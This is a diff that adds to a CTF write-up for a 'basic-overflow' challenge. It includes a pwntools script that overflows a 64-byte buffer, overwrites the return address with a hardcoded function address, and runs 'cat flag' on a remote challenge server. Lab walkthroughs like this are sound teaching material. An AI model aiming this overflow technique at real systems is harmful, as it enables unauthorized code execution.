@@ -38,4 +38,22 @@ If you try this, buffer would indeed overwrited but the function will not called
 
 `\x36\x11\x40\x00\x00\x00\x00\x00`
 
-And if you try to 
+And if you try to inject payload with memory like above, it will fail because it will not represent like bytes. So use python's pwn library.
+
+```python
+import pwn
+
+r = pwn.remote('34.123.15.202', 5000)
+# r = pwn.process('./basic-overflow')
+
+# b"A" * (64 + 8) + b"\x00" * 4 + b"\x36\x11\x40"
+r.sendline(b"A" * (64 + 8)  + b"\x36\x11\x40\x00\x00\x00\x00\x00")
+r.sendline(b"cat flag")
+res = r.recvline()
+
+print(res)
+```
+
+And boom, get the flag
+
+![](../../attachments/Pasted%20image%2020240115142819.png)
